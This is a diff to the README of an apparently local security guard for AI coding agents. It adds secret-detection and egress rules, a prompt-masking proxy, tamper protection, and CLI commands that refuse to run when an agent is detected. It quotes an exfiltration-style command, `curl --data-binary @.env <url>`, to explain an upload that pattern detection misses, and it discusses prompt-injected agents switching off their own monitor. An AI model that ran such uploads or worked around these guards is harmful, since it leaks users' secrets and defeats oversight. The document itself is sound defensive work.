@@ -55,10 +55,16 @@ can write to.
 
 - **Policy rules** — allow or block by path, command, filename or URL.
 - **DLP** — when a call carries a secret (API key, token, private key), block it
-  or keep it from the model.
+  or keep it from the model. 70 built-in patterns, plus globs of your own.
+- **Egress** — a transfer command that would upload a local file holding a secret
+  is refused. `curl --data-binary @.env <url>` reads the file itself, so the secret
+  is in neither the arguments nor the output and pattern DLP cannot see it.
+- **The prompt** — the model also sees what you type and whatever the client sweeps
+  into context, and no tool-call hook is in that path. A shell shim routes `claude`
+  through a local proxy that masks the request body on its way out.
 - **Rate limiting** — cap tool calls per minute, hour or day.
 - **Tamper protection** — the guard's own state cannot be edited by a tool call,
-  by any route.
+  by any route, including the binary it delegates to.
 
 The last three are configured in the same file. Wrap the policy and add
 `security`:
@@ -76,27 +82,30 @@ The last three are configured in the same file. Wrap the policy and add
 ## Where the record goes
 
 Denials are appended to `~/.solongate/local-logs/solongate-audit.jsonl`,
-owner-only. With no service configured there is nothing to send anywhere and no
-attempt is made.
+owner-only, one JSON object per line; the post-tool hook records the rest. What a
+turn cost goes beside it in `token-usage-<date>.jsonl`.
 
-## A service, if a team needs one
-
-Optional. What it adds is one place to keep the policy and the audit log for many
-machines, and sign-in against your own identity provider so it knows who is
-asking. `SOLONGATE_API_URL` points a machine at it; it defaults to
-`http://127.0.0.1:3002`. The decision still happens on each machine.
-
-The server is in this repository (`apps/system`) and runs on infrastructure you
-operate. There is no hosted service.
+Nothing is sent anywhere. There is no service to send it to and no code left in
+the guard that can open a socket.
 
 ## The CLI
 
+Every one of these reads or changes a security posture, so they refuse to run
+without an interactive terminal and refuse when an agent marker is in the
+environment. A prompt-injected agent must not be able to switch off the thing
+watching it.
+
 ```
 solongate                    the dataroom (policies, audit, settings)
+solongate policy             list and edit the policy
+solongate dlp                show and edit secret detection
+solongate ratelimit          show and edit the rate limit
+solongate audit              browse the audit trail
+solongate watch              live-tail tool calls
 solongate doctor             what is installed, and whether it is enforcing
-solongate trace              watch decisions as they happen
+solongate repair             restore the guard, hooks and settings files
 ```
 
 ## Licence
 
-See the repository root.
+MIT. See [LICENSE](LICENSE).
